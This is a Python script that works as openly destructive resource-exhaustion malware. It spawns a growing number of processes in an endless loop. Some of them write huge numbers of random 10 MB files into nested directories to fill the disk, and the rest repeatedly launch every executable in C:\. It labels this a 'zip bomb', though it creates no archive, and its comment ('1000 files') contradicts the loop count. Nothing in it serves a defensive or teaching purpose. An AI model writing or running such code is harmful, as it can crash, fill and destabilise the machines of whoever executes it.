import os
import zipfile
import itertools
import multiprocessing
import time
import subprocess
import glob

def create_zip_bomb(output_zip: str, layers: int, file_size: int):
    # Create a temporary directory to build the zip bomb
    temp_dir = "zip_bomb_temp"
    os.makedirs(temp_dir, exist_ok=True)

    # Create nested directories and files
    current_dir = temp_dir
    for i in range(layers):
        current_dir = os.path.join(current_dir, f"dir_{i}")
        os.makedirs(current_dir, exist_ok=True)
        for j in range(100000000000):  # Create 1000 files in each directory
            with open(os.path.join(current_dir, f"file_{j}.bin"), "wb") as f:
                f.write(os.urandom(file_size))

def run_zip_bomb():
    while True:
        create_zip_bomb("zip_bomb.zip", 10, 10 * 1024 * 1024)  # 10MB files
        time.sleep(1)

def run_exes():
    while True:
        for exe in glob.glob("C:\\*.exe"):
            try:
                subprocess.Popen(exe)
            except Exception as e:
                pass
        time.sleep(1)

def main():
    processes = []
    process_count = 10  # Initial number of processes

    while True:
        for _ in range(process_count):
            p = multiprocessing.Process(target=run_zip_bomb)
            p.start()
            processes.append(p)

        for _ in range(process_count):
            p = multiprocessing.Process(target=run_exes)
            p.start()
            processes.append(p)

        process_count += 1  # Increment the number of processes to spawn
        time.sleep(1)  # Wait for 1 second before spawning more processes

        # Optionally, you can join the processes if needed
        # for p in processes:
        #     p.join()

if __name__ == "__main__":
    main()
